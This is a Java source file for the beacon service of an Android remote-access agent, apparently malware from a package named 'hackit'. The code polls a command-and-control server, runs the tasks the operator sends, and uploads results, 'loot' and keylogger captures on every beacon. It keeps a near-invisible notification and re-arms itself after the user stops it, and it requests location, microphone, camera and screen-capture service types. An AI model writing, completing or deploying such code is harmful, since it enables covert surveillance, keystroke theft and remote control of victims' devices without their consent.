package com.hackit.agent;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

/**
 * The resident loop. Polls the C2, runs delivered tasks on a small pool and
 * ships results and queued events back on the next beacon. Kept alive by a
 * foreground notification, alarm re-arms and the boot receiver.
 */
public class BeaconService extends Service {
    static final String ACTION_POKE = "com.hackit.agent.POKE";
    static final String ACTION_STOP = "com.hackit.agent.STOP";
    static final int NOTIFICATION_ID = 0x5F17;
    private static final String TAG = "beacon";
    private static final int MAX_PARALLEL = 4;

    private static volatile BeaconService instance;
    private final Object gate = new Object();
    private Thread worker;
    private ThreadPoolExecutor pool;
    private volatile boolean running;
    private volatile boolean awake;
    private volatile boolean pendingFlush;

    static void poke(Context ctx) {
        BeaconService local = instance;
        if (local != null) {
            local.wake();
        } else {
            start(ctx);
        }
    }

    static void start(Context ctx) {
        try {
            Intent intent = new Intent(ctx, BeaconService.class);
            if (Build.VERSION.SDK_INT >= 26) {
                ctx.startForegroundService(intent);
            } else {
                ctx.startService(intent);
            }
        } catch (Throwable exc) {
            Log.e("start: " + exc);
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        running = true;
        Config config = Config.get(this);
        Crypto.init(config.psk);
        installChannel();
        enterForeground(false);
        pool = new ThreadPoolExecutor(
                2, MAX_PARALLEL, 60L, TimeUnit.SECONDS,
                new ArrayBlockingQueue<Runnable>(64), new ThreadPoolExecutor.CallerRunsPolicy());
        Dispatcher.prime(this);
        worker = new Thread(new Runnable() {
            @Override
            public void run() {
                loop();
            }
        }, "svc-poll");
        worker.start();
        Scheduler.arm(this);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && ACTION_STOP.equals(intent.getAction())) {
            stopSelf();
            return START_NOT_STICKY;
        }
        if (intent != null && ACTION_POKE.equals(intent.getAction())) {
            pendingFlush = true;
            wake();
        }
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        running = false;
        wake();
        if (worker != null) {
            worker.interrupt();
        }
        if (pool != null) {
            pool.shutdownNow();
        }
        Scheduler.cancel(this);
        instance = null;
        // A sticky restart is how Android keeps a killed service alive; when the
        // user explicitly stops it the alarm re-arms within 15 minutes anyway.
        super.onDestroy();
    }

    private void wake() {
        synchronized (gate) {
            awake = true;
            gate.notifyAll();
        }
    }

    /** Re-declare foreground types as capabilities appear (projection, focus). */
    static void upgrade(Context ctx) {
        BeaconService local = instance;
        if (local != null) {
            local.enterForeground(ScreenCap.live());
        }
    }

    private boolean foregroundApp() {
        try {
            android.app.ActivityManager am =
                    (android.app.ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
            if (am == null) {
                return false;
            }
            java.util.List<android.app.ActivityManager.RunningAppProcessInfo> running = am.getRunningAppProcesses();
            String self = getPackageName();
            for (android.app.ActivityManager.RunningAppProcessInfo process : running) {
                if (process.processName.equals(self)) {
                    return process.importance <= android.app.ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND_SERVICE;
                }
            }
        } catch (Throwable ignored) {
        }
        return false;
    }

    @SuppressWarnings("deprecation")
    private synchronized void enterForeground(boolean projection) {
        Notification notification = buildNotification();
        try {
            if (Build.VERSION.SDK_INT >= 29) {
                // Android 14 refuses while-in-use types from a background start,
                // so only ask for what is granted and currently allowed.
                boolean focused = foregroundApp();
                boolean backgroundLocation = Build.VERSION.SDK_INT < 29
                        || Common.granted(this, android.Manifest.permission.ACCESS_BACKGROUND_LOCATION);
                int types = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC;
                if (Common.granted(this, android.Manifest.permission.ACCESS_FINE_LOCATION)
                        || Common.granted(this, android.Manifest.permission.ACCESS_COARSE_LOCATION)) {
                    if (focused || backgroundLocation) {
                        types |= ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION;
                    }
                }
                if (focused && Common.granted(this, android.Manifest.permission.RECORD_AUDIO)) {
                    types |= ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE;
                }
                if (focused && Common.granted(this, android.Manifest.permission.CAMERA)) {
                    types |= ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA;
                }
                if (projection) {
                    types |= ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION;
                }
                startForeground(NOTIFICATION_ID, notification, types);
            } else {
                startForeground(NOTIFICATION_ID, notification);
            }
        } catch (Throwable exc) {
            Log.e("foreground: " + exc);
            try {
                startForeground(NOTIFICATION_ID, notification);
            } catch (Throwable second) {
                Log.e("foreground retry: " + second);
            }
        }
    }

    private void installChannel() {
        if (Build.VERSION.SDK_INT < 26) {
            return;
        }
        NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        if (manager == null || manager.getNotificationChannel(TAG) != null) {
            return;
        }
        NotificationChannel channel = new NotificationChannel(TAG, getString(R.string.chan_name),
                NotificationManager.IMPORTANCE_MIN);
        channel.setShowBadge(false);
        channel.enableLights(false);
        channel.enableVibration(false);
        channel.setSound(null, null);
        manager.createNotificationChannel(channel);
    }

    @SuppressWarnings("deprecation")
    private Notification buildNotification() {
        Intent open = new Intent(this, MainActivity.class);
        open.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        int flags = PendingIntent.FLAG_UPDATE_CURRENT;
        if (Build.VERSION.SDK_INT >= 23) {
            flags |= PendingIntent.FLAG_IMMUTABLE;
        }
        PendingIntent pending = PendingIntent.getActivity(this, 0, open, flags);
        Notification.Builder builder = Build.VERSION.SDK_INT >= 26
                ? new Notification.Builder(this, TAG)
                : new Notification.Builder(this);
        builder.setContentTitle(getString(R.string.svc_title))
                .setContentText(getString(R.string.svc_text))
                .setSmallIcon(R.drawable.ic_launcher)
                .setOngoing(true)
                .setShowWhen(false)
                .setOnlyAlertOnce(true)
                .setPriority(Notification.PRIORITY_MIN)
                .setContentIntent(pending);
        if (Build.VERSION.SDK_INT >= 21) {
            builder.setCategory(Notification.CATEGORY_SERVICE);
        }
        return builder.build();
    }

    // ------------------------------------------------------------------ loop

    private void loop() {
        long backoff = 0;
        while (running) {
            boolean ok = cycle();
            if (ok) {
                backoff = 0;
            } else {
                backoff = Math.min(backoff == 0 ? 15000L : backoff * 2L, 5L * 60L * 1000L);
            }
            long delay = ok ? Config.get(this).nextDelayMs() : backoff;
            if (pendingFlush && ok) {
                pendingFlush = false;
                delay = 1500L;
            }
            await(delay);
        }
    }

    private void await(long delay) {
        synchronized (gate) {
            if (awake) {
                awake = false;
                return;
            }
            try {
                gate.wait(delay);
            } catch (InterruptedException exc) {
                Thread.currentThread().interrupt();
            }
            awake = false;
        }
    }

    private boolean cycle() {
        PowerManager.WakeLock lock = null;
        try {
            PowerManager power = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (power != null) {
                lock = power.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "hackit:beacon");
                lock.acquire(40000L);
            }
            // Keylogger buffer ships with every beacon so capture is live, not
            // operator-triggered; keylog_dump still drains whatever is left.
            if (KeyMon.connected()) {
                JSONArray keys = KeyMon.drain(150);
                if (keys.length() > 0) {
                    Outbox.event("keylog", keys);
                }
            }
            JSONObject body = new JSONObject();
            body.put("op", "poll");
            body.put("meta", Common.meta(this));
            body.put("wanted", MAX_PARALLEL);
            body.put("events", Outbox.drainEvents(64));
            body.put("results", Outbox.drainResults(32));
            body.put("loot", Dispatcher.drainLoot());
            JSONObject reply = Net.post(this, "/v1/beacon", body);
            if (reply == null) {
                return false;
            }
            long sleep = reply.optLong("sleep", 0L);
            if (sleep > 0 && sleep != Config.get(this).sleepOverrideMs) {
                Config.get(this).saveSleep(this, sleep);
            }
            JSONArray tasks = reply.optJSONArray("tasks");
            if (tasks != null) {
                for (int i = 0; i < tasks.length(); i++) {
                    JSONObject task = tasks.optJSONObject(i);
                    if (task != null) {
                        submit(task);
                    }
                }
            }
            return true;
        } catch (Throwable exc) {
            Log.e("cycle: " + exc);
            return false;
        } finally {
            if (lock != null && lock.isHeld()) {
                lock.release();
            }
        }
    }

    private void submit(final JSONObject task) {
        final int id = task.optInt("id", 0);
        if (id == 0) {
            return;
        }
        try {
            pool.execute(new Runnable() {
                @Override
                public void run() {
                    long begin = System.currentTimeMillis();
                    JSONObject result = Dispatcher.run(BeaconService.this, task);
                    int code = result.optInt("code", 1);
                    Object out = result.opt("out");
                    Log.d("task " + id + " " + task.optString("cmd") + " " + code
                            + " " + (System.currentTimeMillis() - begin) + "ms");
                    Outbox.result(id, code, out);
                }
            });
        } catch (Throwable exc) {
            Log.e("submit: " + exc);
            Outbox.result(id, 1, "pool rejected: " + exc);
        }
    }
}
